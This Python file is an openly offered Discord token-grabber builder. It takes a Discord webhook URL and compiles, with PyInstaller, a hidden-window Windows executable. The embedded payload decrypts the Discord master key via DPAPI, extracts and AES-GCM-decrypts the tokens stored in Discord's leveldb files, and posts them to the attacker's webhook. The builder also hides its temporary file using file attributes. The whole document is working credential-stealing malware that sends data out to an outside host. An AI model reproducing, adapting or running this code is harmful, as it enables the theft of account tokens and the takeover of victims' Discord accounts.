# Copyright (c) Kernel-Tool
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN:
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR:
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

import os
import sys
import subprocess
import shutil
import ctypes

class Colors:
    @staticmethod
    def purple_to_cyan(steps):
        colors = []
        for i in range(steps):
            t = i / max(1, steps - 1)
            r = int(255 + (0 - 255) * t)
            g = int(0 + (255 - 0) * t)
            b = int(255 + (255 - 255) * t)
            colors.append((r, g, b))
        return colors
    
    @staticmethod
    def green_to_cyan(steps):
        colors = []
        for i in range(steps):
            t = i / max(1, steps - 1)
            r = int(0 + (0 - 0) * t)
            g = int(255 + (255 - 255) * t)
            b = int(0 + (255 - 0) * t)
            colors.append((r, g, b))
        return colors
    
    @staticmethod
    def red_to_yellow(steps):
        colors = []
        for i in range(steps):
            t = i / max(1, steps - 1)
            r = int(255 + (255 - 255) * t)
            g = int(0 + (255 - 0) * t)
            b = int(0 + (0 - 0) * t)
            colors.append((r, g, b))
        return colors

class Center:
    @staticmethod
    def XCenter(text):
        lines = text.split('\n')
        terminal_width = shutil.get_terminal_size((80, 20)).columns
        centered = []
        for line in lines:
            stripped = line.rstrip()
            if stripped:
                spaces = (terminal_width - len(stripped)) // 2
                centered.append(' ' * spaces + stripped)
            else:
                centered.append('')
        return '\n'.join(centered)

class Colorate:
    @staticmethod
    def Horizontal(color_func, text, step=1):
        lines = text.split('\n')
        total_chars = sum(len(line) for line in lines)
        colors = color_func(total_chars)
        
        result = []
        color_index = 0
        
        for line in lines:
            colored_line = ""
            for char in line:
                if color_index < len(colors):
                    r, g, b = colors[color_index]
                    colored_line += f"\033[38;2;{r};{g};{b}m{char}"
                    color_index += step
                else:
                    colored_line += char
            result.append(colored_line)
        
        return '\n'.join(result) + "\033[0m"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def Write(text):
    print(text, end='', flush=True)

def set_file_attributes(p):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(p, 6)
    except:
        pass

def main():
    clear_screen()
    
    ascii_art = """
 ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
    """
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(ascii_art)))
    print("\n")
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, "Webhook : "))
    w = input().strip()
    
    if not w.startswith('https://discord.com/api/webhooks/'):
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nWebhook invalide!\n'))
        sys.exit()
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Choose file name : '))
    n = input().strip() or 'grabber'
    
    c = '''import os
import json
import base64
import re
import win32crypt
from Crypto.Cipher import AES
import requests
import ctypes
import sys
WEBHOOK_URL="{webhook_url}"
if sys.platform=="win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
def get_encryption_key():
    try:
        p=os.path.expandvars(r"%APPDATA%\\discord\\Local State")
        with open(p,"r",encoding="utf-8")as f:j=json.load(f)
        k=win32crypt.CryptUnprotectData(base64.b64decode(j["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
        return k
    except:
        return None
def decrypt_payload(c,k):
    try:
        n=c[3:15]
        ci=AES.new(k,AES.MODE_GCM,nonce=n)
        return ci.decrypt_and_verify(c[15:-16],c[-16:]).decode()
    except:
        return""
def find_tokens(p,k):
    t=[]
    r=re.compile(b"dQw4w9WgXcQ:[^\\\"]*")
    for f in os.listdir(p):
        if not(f.endswith(".log")or f.endswith(".ldb")):continue
        try:
            with open(os.path.join(p,f),"rb")as bf:d=bf.read()
            for m in r.findall(d):
                try:
                    dt=decrypt_payload(base64.b64decode(m[len(b"dQw4w9WgXcQ:"):]),k)
                    if dt and len(dt.split('.'))==3:t.append(dt)
                except:continue
        except:continue
    return t
def send_to_webhook(t):
    if not t:return
    try:
        requests.post(WEBHOOK_URL,json={"content":"**Tokens Discord :**\\n"+"\\n".join(t)})
    except:pass
if __name__=="__main__":
    p=os.path.expandvars(r"%APPDATA%\\discord\\Local Storage\\leveldb")
    if not os.path.exists(p):sys.exit()
    k=get_encryption_key()
    if not k:sys.exit()
    send_to_webhook(list(set(find_tokens(p,k))))'''
    
    os.makedirs('output', exist_ok=True)
    t = f'output/{n}_temp.py'
    e = f'output/{n}.exe'
    
    print()
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Creation du payload...\n'))
    
    with open(t, 'w', encoding='utf-8') as f:
        f.write(c.replace('{webhook_url}', w))
    
    set_file_attributes(t)
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Compilation en cours...\n'))
    
    if subprocess.run(['pyinstaller', '--version'], capture_output=True).returncode != 0:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nPyInstaller non installe!\n'))
        Write(Colorate.Horizontal(Colors.green_to_cyan, '   pip install pyinstaller\n'))
        sys.exit()
    
    r = subprocess.run([
        'pyinstaller',
        '--onefile',
        '--windowed',
        '--hidden-import', 'Crypto',
        '--hidden-import', 'Crypto.Cipher',
        '--hidden-import', 'win32crypt',
        '--noconfirm',
        '--clean',
        t
    ], capture_output=True, text=True)
    
    if r.returncode != 0:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nErreur de compilation!\n'))
        print(r.stderr[:500])
        sys.exit()
    
    shutil.move(f'dist/{n}_temp.exe', e)
    
    for p in [t, f'{n}_temp.spec', 'build', 'dist', '__pycache__']:
        try:
            os.remove(p) if os.path.isfile(p) else shutil.rmtree(p, ignore_errors=True)
        except:
            pass
    
    print()
    success_banner = "══════════════════════════════════════════════════════════════════════\n                         COMPILATION REUSSIE!\n══════════════════════════════════════════════════════════════════════"
    Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(success_banner)))
    print("\n")
    Write(Colorate.Horizontal(Colors.green_to_cyan, f"Fichier : output/{n}.exe\n"))
    print()

if __name__ == "__main__":
    main()
